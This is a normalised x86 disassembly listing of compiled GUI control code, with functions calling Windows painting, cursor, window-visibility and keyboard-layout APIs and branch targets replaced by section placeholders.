sub_432054
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432084
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f3c0
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
mov esp ebp
pop ebp
retn
sub_4320e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x10
je r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ ebp - 0xb ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x45 ] 0x2
jne r-xdata
mov al [ ebp - 0xa ]
or al [ ebp - 0xb ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42e9b0
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bf8
mov eax [ ebp - 0x4 ]
call sub_4345b4
mov esp ebp
pop ebp
retn
mov al [ ebp - 0xa ]
or al [ ebp - 0xb ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4345b4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_4321cc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
and ax [ edx + 0x20 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x14 ]
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42e5e4
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x18 ] 0x1
sub_43223c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434bf8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4302c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffd4
call sub_44c24c
sub_432280
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_434bf8
pop ecx
pop ecx
pop ebp
retn
sub_4322a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14c ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x8 ]
sub ax 0xfffe
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ax [ eax + 0x38 ]
mov [ ebp - 0xa ] ax
cmp [ ebp - 0xa ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x24 ]
push eax
call GetLastActivePopup
mov ebx eax
call GetForegroundWindow
cmp ebx eax
je r-xdata
cmp [ ebp - 0xa ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call GetCursorPos
push 0x0
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
lea edx [ ebp - 0x20 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43130c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_424a5c
jmp r-xdata
movsx edx [ ebp - 0xa ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
push eax
call SetCursor
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x20 ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x10 ]
mov ax [ eax + 0x68 ]
mov [ ebp - 0xa ] ax
mov [ ebp - 0xa ] 0xfffe
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x68 ]
mov [ ebp - 0xa ] ax
mov [ ebp - 0xa ] 0xfffe
jmp r-xdata
sub_4323e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_432478
pop ecx
pop ecx
pop ebp
retn
sub_432404
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_432584
pop ecx
pop ecx
pop ebp
retn
sub_432428
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e9 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_432450
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e9 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_432478
push ebp
mov ebp esp
add esp 0xfffffff0
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432576
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43257d
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x158 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x154 ]
call sub_439d74
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422cdc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x158 ]
call sub_4462cc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422abc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x154 ] 0x0
je r-xdata
push 0x1
mov eax [ ebp - 0xc ]
push eax
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422abc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x158 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422abc
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
sub_432584
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43261e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432625
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x158 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x154 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422cdc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x158 ]
call sub_4462cc
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
mov dl 0x1
call sub_439d3c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call ActivateKeyboardLayout
sub_43262c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov esp ebp
pop ebp
retn
sub_43265c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call [ ebx + 0x198 ]
sub_432688
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1a4 ]
call [ ebx + 0x1a0 ]
sub_4326b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dx [ ebp + 0x8 ]
mov ax [ ebp - 0xc ]
call sub_43b7a0
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0xb038
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18c ]
call [ ebx + 0x188 ]
sub_432718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x192 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x194 ]
call [ ebx + 0x190 ]
sub_432764
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffd7
call sub_44c24c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffca
call sub_44c24c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4327a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xd ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0xb039
mov eax [ ebp - 0x4 ]
call sub_42df28
test eax eax
je r-xdata
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
sub_432818
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4428c4
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov esp ebp
pop ebp
retn
sub_43284c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x140 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x140 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_432880
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x140 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x140 ]
call sub_43c464
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4328bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowRect
push 0xa
push 0xa
mov eax [ ebp - 0xc ]
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1ac ]
call [ ebx + 0x1a8 ]
sub_43292c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43284c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0xc ] eax
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
dec [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x140 ]
call sub_43c464
cmp [ eax + 0x47 ] 0x0
jne r-xdata
sub_43297c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x148 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x148 ]
call sub_44e3e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x144 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1e8 ] al
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_44e3e8
jmp r-xdata
sub edx 0xffffff8c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e8 ] 0x0
jne r-xdata
sub_432a04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432ada
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x144 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ae1
lea eax [ ebp - 0xc ]
call sub_44e3d0
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x144 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_429f64
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x140 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x140 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x140 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x148
call sub_44e3d0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov bx 0xffcd
call sub_44c24c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x148
call sub_44e3e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x140 ] eax
sub_432ae8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_430280
xor eax eax
push ebp
push sub_432bb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov bx 0xffd1
call sub_44c24c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432bba
mov eax [ ebp - 0x4 ]
call sub_430294
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x58 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov cl [ eax + 0x54 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x148 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_432bba
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
call sub_42cdec
sub_432be4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x148 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_432c28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_44bfb8
cmp ebx eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42eec8
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x47 ]
mov [ ebp - 0x9 ] al
xor eax eax
push ebp
push sub_432c95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov bx 0xffd1
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_42cdec
sub_432cac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_432ce8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41a678
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov edx [ ebp - 0x8 ]
add edx 0x4
mov cl [ ebp - 0xa ]
mov eax [ ebp - 0x4 ]
mov bx 0xffc0
call sub_44c24c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x215 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_432ce8
test al al
jne r-xdata
sub_432d70
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432ce8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432d9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432ce8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432dc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_432e04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41a678
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov edx [ ebp - 0x8 ]
add edx 0x4
mov cl [ ebp - 0xa ]
mov eax [ ebp - 0x4 ]
mov bx 0xffbf
